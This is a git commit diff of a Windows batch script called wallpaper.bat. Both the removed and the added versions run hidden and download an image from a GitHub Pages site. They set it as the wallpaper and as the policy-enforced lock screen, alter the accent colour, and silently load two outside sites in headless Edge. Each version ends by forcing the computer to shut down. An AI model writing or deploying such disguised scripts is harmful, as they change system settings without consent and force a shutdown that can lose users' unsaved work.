9667b8b1867d0178b7f5e9fc80839c12a58046fc
cmd-hue <guh.huh.egg4@gmail.com>
2025-10-23 23:29:23 -0400

    Update wallpaper.bat

--- wallpaper.bat
+++ wallpaper.bat
@@ -1,22 +1,14 @@
 @echo off
-set "vbsFile=%temp%\hidebat.vbs"
-echo Set WshShell = CreateObject("WScript.Shell") > "%vbsFile%"
-echo WshShell.Run """" ^& WScript.Arguments(0) ^& """", 0, False >> "%vbsFile%"
-cscript //nologo "%vbsFile%" "%~f0"
-exit /b
-
-set "imgUrl=https://cmd-hue.github.io/coinslot/og.png"
-set "imgPath=%USERPROFILE%\Pictures\coinslot_og.png"
-
-powershell -Command "Invoke-WebRequest -Uri '%imgUrl%' -OutFile '%imgPath%'"
-
-reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%imgPath%" /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v LockScreenImage /t REG_SZ /d "%imgPath%" /f
-reg add "HKCU\Software\Microsoft\Windows\DWM" /v AccentColor /t REG_DWORD /d 0xff6100 /f
-
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True
-
-powershell -WindowStyle Hidden -Command "Start-Process '%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe' -ArgumentList '--headless','--disable-gpu','--dump-dom','https://youtomb.github.io' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "Start-Process '%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe' -ArgumentList '--headless','--disable-gpu','--dump-dom','https://youtomb-mobile.github.io' -WindowStyle Hidden"
-
-shutdown /s /t 1 /f /d p:0:0
+powershell -WindowStyle Hidden -Command ^
+  "$imgUrl='https://cmd-hue.github.io/coinslot/og.png';" ^
+  "$imgPath='$env:USERPROFILE\Pictures\coinslot_og.png';" ^
+  "Invoke-WebRequest -Uri $imgUrl -OutFile $imgPath;" ^
+  "[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices') | Out-Null;" ^
+  "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(""user32.dll"", SetLastError=true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }';" ^
+  "[Wallpaper]::SystemParametersInfo(20,0,$imgPath,3) | Out-Null;" ^
+  "New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization' -Force | Out-Null;" ^
+  "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization' -Name LockScreenImage -Value $imgPath;" ^
+  "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\DWM' -Name AccentColor -Value 0xff6100;" ^
+  "Start-Process 'msedge.exe' '--headless --disable-gpu --dump-dom https://youtomb.github.io';" ^
+  "Start-Process 'msedge.exe' '--headless --disable-gpu --dump-dom https://youtomb-mobile.github.io';" ^
+  "Stop-Computer -Force"
